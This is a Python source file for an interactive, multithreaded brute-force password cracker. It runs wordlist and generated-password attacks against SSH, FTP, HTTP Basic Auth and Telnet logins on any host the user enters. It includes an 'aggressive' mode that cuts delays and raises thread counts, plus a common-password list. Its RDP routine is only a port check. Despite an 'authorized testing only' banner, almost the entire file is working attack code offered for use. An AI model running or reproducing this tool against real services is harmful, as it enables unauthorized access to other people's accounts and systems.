#!/usr/bin/env python3
"""
Password Cracker Module - Network Brute Force
Educational demonstration of network service brute force attacks
WARNING: Use only for authorized security testing!
"""

import socket
import itertools
import string
import threading
import time
import os
import warnings
import logging
from colorama import Fore, Style

# Suppress paramiko verbose logging
logging.getLogger("paramiko").setLevel(logging.ERROR)
warnings.filterwarnings("ignore")

# Try to import optional libraries
try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

try:
    from ftplib import FTP
    FTP_AVAILABLE = True
except ImportError:
    FTP_AVAILABLE = False

try:
    import requests
    HTTP_AVAILABLE = True
except ImportError:
    HTTP_AVAILABLE = False

class PasswordCracker:
    def __init__(self):
        self.stop_cracking = False
        self.attempts = 0
        self.start_time = None
        self.found_password = None
        self.lock = threading.Lock()
    
    def print_banner(self):
        """Print password cracker banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║         {Fore.YELLOW}Network Service Brute Force Cracker{Fore.CYAN}            ║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.RED}WARNING: Use only for authorized security testing!{Fore.CYAN}        ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def get_default_wordlist(self):
        """Get default password wordlist"""
        return [
            "password", "123456", "123456789", "12345678", "12345",
            "1234567", "1234567890", "qwerty", "abc123", "password1",
            "admin", "letmein", "welcome", "monkey", "dragon",
            "master", "hello", "freedom", "whatever", "qwerty123",
            "trustno1", "jordan23", "harley", "shadow", "superman",
            "michael", "football", "iloveyou", "starwars", "root",
            "toor", "pass", "test", "guest", "user", "administrator"
        ]
    
    def brute_force_ssh(self, host, port, username, passwords, threads=10, aggressive=False):
        """Brute force SSH service"""
        if not SSH_AVAILABLE:
            print(f"{Fore.RED}[!] paramiko library not installed. Install with: pip install paramiko{Style.RESET_ALL}")
            return None
        
        # Adjust threads and delays based on aggressive mode
        if aggressive:
            threads = min(threads * 2, 20)  # Up to 20 threads in aggressive mode
            delay_auth = 0.1
            delay_conn = 0.2
        else:
            delay_auth = 0.3
            delay_conn = 0.5
        
        print(f"{Fore.YELLOW}[*] Starting SSH brute force attack...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {host}:{port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Username: {username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Passwords to try: {len(passwords)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using {threads} threads ({'AGGRESSIVE' if aggressive else 'NORMAL'} mode){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Connection errors will be suppressed (this is normal){Style.RESET_ALL}\n")
        
        self.attempts = 0
        self.start_time = time.time()
        self.found_password = None
        
        def try_password(password):
            if self.found_password or self.stop_cracking:
                return False
            
            # Strip whitespace from password
            password = password.strip() if password else password
            if not password:
                return False
            
            ssh = None
            # Completely suppress stderr during connection attempts
            import sys
            from io import StringIO
            
            # Save original stderr
            original_stderr = sys.stderr
            
            try:
                # Redirect stderr to suppress paramiko errors
                sys.stderr = StringIO()
                
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Set connection timeout - reduced for speed
                ssh.connect(
                    host, 
                    port=port, 
                    username=username, 
                    password=password, 
                    timeout=5 if aggressive else 10,
                    allow_agent=False,
                    look_for_keys=False,
                    banner_timeout=5 if aggressive else 10
                )
                
                # Restore stderr before printing success
                sys.stderr = original_stderr
                
                # If we get here, authentication was successful
                ssh.close()
                
                with self.lock:
                    if not self.found_password:  # Double check to avoid race condition
                        self.found_password = password
                        elapsed = time.time() - self.start_time
                        print(f"\n{Fore.GREEN}[+] Password found!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Username: {username}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[*] Attempts: {self.attempts}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[*] Time elapsed: {elapsed:.2f} seconds{Style.RESET_ALL}")
                return True
                
            except paramiko.AuthenticationException as e:
                # Wrong password - this is expected
                sys.stderr = original_stderr  # Restore stderr
                with self.lock:
                    self.attempts += 1
                    if self.attempts % 50 == 0:  # Show progress less frequently for speed
                        elapsed = time.time() - self.start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        print(f"{Fore.CYAN}[*] Attempts: {self.attempts} | Rate: {rate:.1f} attempts/sec | Testing: {password[:20]}{Style.RESET_ALL}")
                if not aggressive:
                    time.sleep(delay_auth)  # Minimal delay
                return False
                
            except (paramiko.SSHException, socket.error, OSError, ConnectionError, EOFError, ConnectionAbortedError) as e:
                # Connection errors - retry might work
                sys.stderr = original_stderr  # Restore stderr
                with self.lock:
                    self.attempts += 1
                    if self.attempts % 50 == 0:  # Show progress less frequently for speed
                        elapsed = time.time() - self.start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        print(f"{Fore.CYAN}[*] Attempts: {self.attempts} | Rate: {rate:.1f} attempts/sec | Connection error, retrying...{Style.RESET_ALL}")
                if not aggressive:
                    time.sleep(delay_conn)  # Longer delay on connection errors
                return False
                
            except Exception as e:
                # Other unexpected errors - log but continue
                sys.stderr = original_stderr  # Restore stderr
                with self.lock:
                    self.attempts += 1
                    # Don't print every error, just continue
                if not aggressive:
                    time.sleep(delay_conn)
                return False
                
            finally:
                # Always restore stderr
                sys.stderr = original_stderr
                # Ensure connection is closed
                try:
                    if ssh:
                        ssh.close()
                except:
                    pass
        
        # Multi-threaded attack with better queue management
        import queue
        password_queue = queue.Queue()
        # Strip passwords and add to queue
        for pwd in passwords:
            pwd_clean = pwd.strip() if isinstance(pwd, str) else str(pwd).strip()
            if pwd_clean:  # Only add non-empty passwords
                password_queue.put(pwd_clean)
        
        total_passwords = password_queue.qsize()
        print(f"{Fore.CYAN}[*] Total passwords in queue: {total_passwords}{Style.RESET_ALL}")
        
        def worker():
            while not self.found_password and not self.stop_cracking:
                try:
                    password = password_queue.get_nowait()
                    if try_password(password):
                        # Password found - stop all threads
                        self.stop_cracking = True
                        break
                    password_queue.task_done()
                except queue.Empty:
                    # Queue is empty, exit
                    break
                except Exception as e:
                    # Continue on any other error
                    continue
        
        thread_list = []
        stagger_delay = 0.05 if aggressive else 0.1
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)
            if not aggressive:
                time.sleep(stagger_delay)  # Minimal stagger
        
        # Wait for all threads to complete
        for t in thread_list:
            t.join(timeout=300)  # Max 5 minutes per thread
        
        # Wait a bit more to ensure all threads finished
        time.sleep(0.5)
        
        if not self.found_password:
            print(f"\n{Fore.RED}[-] Password not found{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Total attempts: {self.attempts}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Total passwords tested: {min(self.attempts, total_passwords)}/{total_passwords}{Style.RESET_ALL}")
            if self.attempts < total_passwords:
                print(f"{Fore.YELLOW}[!] Warning: Not all passwords were tested. Some may have been skipped due to connection errors.{Style.RESET_ALL}")
        
        return self.found_password
    
    def brute_force_ftp(self, host, port, username, passwords, threads=10):
        """Brute force FTP service"""
        if not FTP_AVAILABLE:
            print(f"{Fore.RED}[!] FTP library not available{Style.RESET_ALL}")
            return None
        
        print(f"{Fore.YELLOW}[*] Starting FTP brute force attack...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {host}:{port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Username: {username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Passwords to try: {len(passwords)}{Style.RESET_ALL}\n")
        
        self.attempts = 0
        self.start_time = time.time()
        self.found_password = None
        
        def try_password(password):
            if self.found_password or self.stop_cracking:
                return False
            
            ftp = None
            try:
                ftp = FTP()
                ftp.connect(host, port, timeout=10)
                ftp.login(username, password)
                ftp.quit()
                
                with self.lock:
                    self.found_password = password
                    elapsed = time.time() - self.start_time
                    print(f"\n{Fore.GREEN}[+] Password found!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Username: {username}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Attempts: {self.attempts}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Time elapsed: {elapsed:.2f} seconds{Style.RESET_ALL}")
                return True
            except Exception as e:
                with self.lock:
                    self.attempts += 1
                    if self.attempts % 50 == 0:  # Show progress less frequently
                        elapsed = time.time() - self.start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        print(f"{Fore.CYAN}[*] Attempts: {self.attempts} | Rate: {rate:.1f} attempts/sec | Testing: {password[:20]}{Style.RESET_ALL}")
                time.sleep(0.1)  # Minimal delay
                return False
            finally:
                try:
                    if ftp:
                        ftp.quit()
                except:
                    pass
        
        # Multi-threaded attack with queue
        import queue
        password_queue = queue.Queue()
        for pwd in passwords:
            password_queue.put(pwd)
        
        def worker():
            while not password_queue.empty() and not self.found_password and not self.stop_cracking:
                try:
                    password = password_queue.get_nowait()
                    if try_password(password):
                        while not password_queue.empty():
                            try:
                                password_queue.get_nowait()
                            except:
                                break
                        break
                    password_queue.task_done()
                except queue.Empty:
                    break
                except Exception:
                    continue
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)
        
        for t in thread_list:
            t.join(timeout=300)
        
        if not self.found_password:
            print(f"\n{Fore.RED}[-] Password not found{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Attempts: {self.attempts}{Style.RESET_ALL}")
        
        return self.found_password
    
    def brute_force_rdp(self, host, port, username, passwords, threads=3):
        """Brute force RDP service (Windows Remote Desktop)"""
        print(f"{Fore.YELLOW}[*] Starting RDP brute force attack...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {host}:{port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Username: {username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Passwords to try: {len(passwords)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Note: RDP brute force uses socket connection testing{Style.RESET_ALL}\n")
        
        self.attempts = 0
        self.start_time = time.time()
        self.found_password = None
        
        def try_password(password):
            if self.found_password or self.stop_cracking:
                return False
            
            try:
                # RDP connection test (simplified)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((host, port))
                sock.close()
                
                # Note: Actual RDP authentication requires special protocol
                # This is a simplified connection test
                with self.lock:
                    self.attempts += 1
                    if self.attempts % 10 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        print(f"{Fore.CYAN}[*] Attempts: {self.attempts} | Rate: {rate:.1f} attempts/sec | Testing: {password[:20]}{Style.RESET_ALL}")
                
                # For actual RDP, you would need pyrdp or similar library
                print(f"{Fore.YELLOW}[!] RDP authentication requires specialized libraries{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Consider using tools like Hydra or Medusa for RDP{Style.RESET_ALL}")
                return False
            except:
                with self.lock:
                    self.attempts += 1
                return False
        
        # Try a few passwords to demonstrate
        for password in passwords[:5]:
            if self.stop_cracking:
                break
            try_password(password)
        
        print(f"\n{Fore.YELLOW}[!] RDP brute force requires specialized tools{Style.RESET_ALL}")
        return None
    
    def brute_force_http(self, url, username, passwords, threads=10):
        """Brute force HTTP Basic Authentication"""
        if not HTTP_AVAILABLE:
            print(f"{Fore.RED}[!] requests library not installed. Install with: pip install requests{Style.RESET_ALL}")
            return None
        
        print(f"{Fore.YELLOW}[*] Starting HTTP Basic Auth brute force attack...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Username: {username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Passwords to try: {len(passwords)}{Style.RESET_ALL}\n")
        
        self.attempts = 0
        self.start_time = time.time()
        self.found_password = None
        
        def try_password(password):
            if self.found_password or self.stop_cracking:
                return False
            
            try:
                response = requests.get(url, auth=(username, password), timeout=5)
                if response.status_code == 200:
                    with self.lock:
                        self.found_password = password
                        elapsed = time.time() - self.start_time
                        print(f"\n{Fore.GREEN}[+] Password found!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Username: {username}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[*] Attempts: {self.attempts}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[*] Time elapsed: {elapsed:.2f} seconds{Style.RESET_ALL}")
                    return True
            except:
                pass
            
            with self.lock:
                self.attempts += 1
                if self.attempts % 10 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    print(f"{Fore.CYAN}[*] Attempts: {self.attempts} | Rate: {rate:.1f} attempts/sec | Testing: {password[:20]}{Style.RESET_ALL}")
            return False
        
        # Multi-threaded attack
        thread_list = []
        password_queue = list(passwords)
        
        def worker():
            while password_queue and not self.found_password and not self.stop_cracking:
                try:
                    password = password_queue.pop(0)
                    if try_password(password):
                        break
                except IndexError:
                    break
        
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)
        
        for t in thread_list:
            t.join()
        
        if not self.found_password:
            print(f"\n{Fore.RED}[-] Password not found{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Attempts: {self.attempts}{Style.RESET_ALL}")
        
        return self.found_password
    
    def brute_force_telnet(self, host, port, username, passwords, threads=10):
        """Brute force Telnet service"""
        print(f"{Fore.YELLOW}[*] Starting Telnet brute force attack...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {host}:{port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Username: {username}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Passwords to try: {len(passwords)}{Style.RESET_ALL}\n")
        
        self.attempts = 0
        self.start_time = time.time()
        self.found_password = None
        
        def try_password(password):
            if self.found_password or self.stop_cracking:
                return False
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                # Simple telnet authentication
                data = sock.recv(1024)
                sock.send((username + '\r\n').encode())
                time.sleep(0.5)
                data = sock.recv(1024)
                sock.send((password + '\r\n').encode())
                time.sleep(0.5)
                data = sock.recv(1024)
                sock.close()
                
                # Check if login was successful (simplified)
                if b'$' in data or b'#' in data or b'>' in data:
                    with self.lock:
                        self.found_password = password
                        elapsed = time.time() - self.start_time
                        print(f"\n{Fore.GREEN}[+] Password found!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Username: {username}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[*] Attempts: {self.attempts}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[*] Time elapsed: {elapsed:.2f} seconds{Style.RESET_ALL}")
                    return True
            except:
                pass
            
            with self.lock:
                self.attempts += 1
                if self.attempts % 10 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    print(f"{Fore.CYAN}[*] Attempts: {self.attempts} | Rate: {rate:.1f} attempts/sec | Testing: {password[:20]}{Style.RESET_ALL}")
            return False
        
        # Multi-threaded attack
        thread_list = []
        password_queue = list(passwords)
        
        def worker():
            while password_queue and not self.found_password and not self.stop_cracking:
                try:
                    password = password_queue.pop(0)
                    if try_password(password):
                        break
                except IndexError:
                    break
        
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)
        
        for t in thread_list:
            t.join()
        
        if not self.found_password:
            print(f"\n{Fore.RED}[-] Password not found{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Attempts: {self.attempts}{Style.RESET_ALL}")
        
        return self.found_password
    
    def generate_brute_force_passwords(self, max_length=4, charset=None):
        """Generate passwords for brute force"""
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        passwords = []
        for length in range(1, max_length + 1):
            for password_tuple in itertools.product(charset, repeat=length):
                passwords.append(''.join(password_tuple))
                if len(passwords) >= 10000:  # Limit for performance
                    return passwords
        return passwords
    
    def run(self):
        """Run password cracker interface"""
        self.print_banner()
        
        print(f"{Fore.YELLOW}[*] Select service to brute force:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[1]{Fore.CYAN} SSH (Port 22){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[2]{Fore.CYAN} FTP (Port 21){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[3]{Fore.CYAN} RDP (Port 3389){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[4]{Fore.CYAN} HTTP/HTTPS Basic Auth{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[5]{Fore.CYAN} Telnet (Port 23){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[6]{Fore.CYAN} Custom Port/Service{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}[*] Select option: {Style.RESET_ALL}").strip()
        
        # Ask for aggressive mode and thread count
        aggressive = input(f"{Fore.YELLOW}[*] Use aggressive mode? (faster, more threads) (y/n, default n): {Style.RESET_ALL}").strip().lower() == 'y'
        
        # Ask for thread count
        thread_input = input(f"{Fore.YELLOW}[*] Number of threads (default {'20' if aggressive else '10'}): {Style.RESET_ALL}").strip()
        try:
            thread_count = int(thread_input) if thread_input else (20 if aggressive else 10)
        except ValueError:
            thread_count = 20 if aggressive else 10
        
        # Get target information
        target = input(f"{Fore.YELLOW}[*] Enter target IP or domain: {Style.RESET_ALL}").strip()
        if not target:
            print(f"{Fore.RED}[!] Target required{Style.RESET_ALL}")
            return
        
        username = input(f"{Fore.YELLOW}[*] Enter username: {Style.RESET_ALL}").strip()
        if not username:
            print(f"{Fore.RED}[!] Username required{Style.RESET_ALL}")
            return
        
        # Get password source
        print(f"\n{Fore.YELLOW}[*] Password source:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[1]{Fore.CYAN} Use default wordlist{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[2]{Fore.CYAN} Brute force (generate passwords){Style.RESET_ALL}")
        print(f"  {Fore.GREEN}[3]{Fore.CYAN} Custom wordlist file{Style.RESET_ALL}")
        
        pwd_choice = input(f"{Fore.YELLOW}[*] Select option: {Style.RESET_ALL}").strip()
        
        passwords = []
        if pwd_choice == '1':
            passwords = self.get_default_wordlist()
        elif pwd_choice == '2':
            max_len = input(f"{Fore.YELLOW}[*] Maximum password length (default 4): {Style.RESET_ALL}").strip()
            try:
                max_len = int(max_len) if max_len else 4
            except ValueError:
                max_len = 4
            
            charset_input = input(f"{Fore.YELLOW}[*] Character set (lowercase+digits/ascii/all, default lowercase+digits): {Style.RESET_ALL}").strip().lower()
            if charset_input == 'ascii':
                charset = string.ascii_letters + string.digits
            elif charset_input == 'all':
                charset = string.ascii_letters + string.digits + string.punctuation
            else:
                charset = string.ascii_lowercase + string.digits
            
            print(f"{Fore.YELLOW}[*] Generating passwords...{Style.RESET_ALL}")
            passwords = self.generate_brute_force_passwords(max_len, charset)
            print(f"{Fore.GREEN}[+] Generated {len(passwords)} passwords{Style.RESET_ALL}")
        elif pwd_choice == '3':
            wordlist_path = input(f"{Fore.YELLOW}[*] Enter wordlist file path: {Style.RESET_ALL}").strip()
            if os.path.exists(wordlist_path):
                try:
                    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip()]
                    print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords from wordlist{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading wordlist: {e}{Style.RESET_ALL}")
                    return
            else:
                print(f"{Fore.RED}[!] Wordlist file not found{Style.RESET_ALL}")
                return
        else:
            print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            return
        
        if not passwords:
            print(f"{Fore.RED}[!] No passwords to try{Style.RESET_ALL}")
            return
        
        # Execute brute force based on service
        try:
            if choice == '1':  # SSH
                port = input(f"{Fore.YELLOW}[*] Enter port (default 22): {Style.RESET_ALL}").strip()
                port = int(port) if port else 22
                self.brute_force_ssh(target, port, username, passwords, threads=thread_count, aggressive=aggressive)
            elif choice == '2':  # FTP
                port = input(f"{Fore.YELLOW}[*] Enter port (default 21): {Style.RESET_ALL}").strip()
                port = int(port) if port else 21
                self.brute_force_ftp(target, port, username, passwords, threads=thread_count)
            elif choice == '3':  # RDP
                port = input(f"{Fore.YELLOW}[*] Enter port (default 3389): {Style.RESET_ALL}").strip()
                port = int(port) if port else 3389
                self.brute_force_rdp(target, port, username, passwords)
            elif choice == '4':  # HTTP
                url = input(f"{Fore.YELLOW}[*] Enter full URL (e.g., http://example.com/admin): {Style.RESET_ALL}").strip()
                if not url:
                    url = f"http://{target}"
                self.brute_force_http(url, username, passwords, threads=thread_count)
            elif choice == '5':  # Telnet
                port = input(f"{Fore.YELLOW}[*] Enter port (default 23): {Style.RESET_ALL}").strip()
                port = int(port) if port else 23
                self.brute_force_telnet(target, port, username, passwords, threads=thread_count)
            elif choice == '6':  # Custom
                port = input(f"{Fore.YELLOW}[*] Enter port: {Style.RESET_ALL}").strip()
                if not port:
                    print(f"{Fore.RED}[!] Port required{Style.RESET_ALL}")
                    return
                port = int(port)
                service = input(f"{Fore.YELLOW}[*] Service type (ssh/ftp/telnet, default telnet): {Style.RESET_ALL}").strip().lower()
                if service == 'ssh':
                    self.brute_force_ssh(target, port, username, passwords, threads=thread_count, aggressive=aggressive)
                elif service == 'ftp':
                    self.brute_force_ftp(target, port, username, passwords, threads=thread_count)
                else:
                    self.brute_force_telnet(target, port, username, passwords, threads=thread_count)
            else:
                print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Attack interrupted by user{Style.RESET_ALL}")
            self.stop_cracking = True
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
